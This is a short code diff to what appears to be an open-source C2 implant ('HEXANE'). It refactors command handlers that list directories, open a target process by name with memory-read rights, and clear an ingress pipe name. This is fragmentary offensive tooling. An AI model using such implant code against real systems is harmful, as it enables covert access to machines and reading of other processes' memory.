@@ -1,4 +1,6 @@
 #include <core/include/commands.hpp>
+#include <core/dotnet.hpp>
+
 namespace Commands {
 
     VOID DirectoryList (PPARSER Parser) {
@@ -99,8 +101,8 @@ namespace Commands {
         Stream::PackDword(Outbound, CommandMods);
 
         if (
-            !(Pid       = Process::GetProcessIdByName(Parser::UnpackString(Parser, nullptr))) ||
-            !(Process   = Process::NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
+            !(Pid = Process::GetProcessIdByName(Parser::UnpackString(Parser, nullptr))) ||
+            !NT_SUCCESS(Process::NtOpenProcess(&Process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
             return_defer(ERROR_PROCESS_IS_PROTECTED);
         }
 
@@ -228,8 +230,8 @@ namespace Commands {
         HEXANE
 
         auto nameLength = x_wcslen(Ctx->Config.IngressPipename) * sizeof(WCHAR);
-        if (Ctx->Config.IngressPipename) {
 
+        if (Ctx->Config.IngressPipename) {
             x_memset(Ctx->Config.IngressPipename, 0, nameLength);
             Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Ctx->Config.IngressPipename);
         }
